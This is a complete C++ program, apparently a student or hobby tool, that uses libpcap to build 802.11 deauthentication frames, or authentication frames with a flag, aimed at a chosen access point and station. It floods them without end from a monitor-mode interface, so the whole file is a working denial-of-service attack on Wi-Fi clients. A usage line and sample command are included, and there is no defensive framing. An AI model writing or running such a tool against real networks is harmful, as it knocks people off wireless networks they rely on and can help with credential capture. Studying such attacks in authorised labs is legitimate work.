#include <pcap.h>
#include <iostream>
#include <unistd.h>
#include "mac.h"


using namespace std;


#pragma pack(push, 1)
struct ieee80211_radiotap_header {
        u_int8_t        it_version;     /* set to 0 */
        u_int8_t        it_pad;
        u_int16_t       it_len;         /* entire length */
        u_int32_t       it_present;     /* fields present */
	u_int8_t	data_rate;
    	u_int8_t 	zero;
    	u_int16_t 	tx;
};
#pragma pack(pop)


#pragma pack(push, 1)
struct beacon_frame{
    	u_int8_t type;
    	u_int8_t flags;
	u_int16_t duration;
   	Mac dest;
    	Mac src;
    	Mac bssid;
    	u_int16_t seq;
	u_int16_t fix;

    	u_int64_t timestamp; /* fixed parameters */
    	u_int16_t beacon_interval;
    	u_int16_t capa_info;

    	u_int8_t tag_num; /* tag parameters */
    	u_int8_t len;
    	char essid[50];
};
#pragma pack(pop)



#pragma pack(push, 1)
struct deauth_packet{
  	ieee80211_radiotap_header rth;
  	beacon_frame bf;
};
#pragma pack(pop)


void usage() {
    	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]]\n");
    	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}



int main(int argc, char** argv){
	Mac ap, station;
    	bool a;
	if (argc < 3 || argc > 5) {
        	usage();
        	return -1;
    	}

    	ap = Mac(argv[2]);
    	station = Mac::broadcastMac();
    	a = 0;

    	if (argc >= 4) {
        	station = Mac(argv[3]);
	}
    	if (argc == 5) {
        	a = (string(argv[4]) == "-auth");
        	if (!a) {
            		usage();
            		return -1;
        	}
	}

    	char errbuf[PCAP_ERRBUF_SIZE];
    	pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 100, errbuf);
    	if (handle == NULL) {
        	fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        	return -1;
    	}

	deauth_packet dp;

    	dp.rth.it_version = 0;
   	dp.rth.it_pad = 0;
    	dp.rth.it_len = 12;
    	dp.rth.it_present = 0x00008004;
    	dp.rth.data_rate = 2;
    	dp.rth.zero = 0;
    	dp.rth.tx = 0x18;
    	dp.bf.type = a ? 0xb0 : 0xc0;
    	dp.bf.flags = 0;
    	dp.bf.duration = 0;
    	dp.bf.dest = a ? ap : station;
    	dp.bf.src = a ? station : ap;
    	dp.bf.bssid = ap;
    	dp.bf.seq = 0;
    	dp.bf.fix = 7;

	if (station != Mac::broadcastMac() && !a) {
        	Mac temp = dp.bf.src;
        	dp.bf.src = dp.bf.dest;
        	dp.bf.dest = temp;
	}
	
	while (true) {
        	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&dp), sizeof(dp));
        	if (res != 0) {
            		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        	}
        	sleep(0.5);
    	}
    	pcap_close(handle);

	return 0;
}





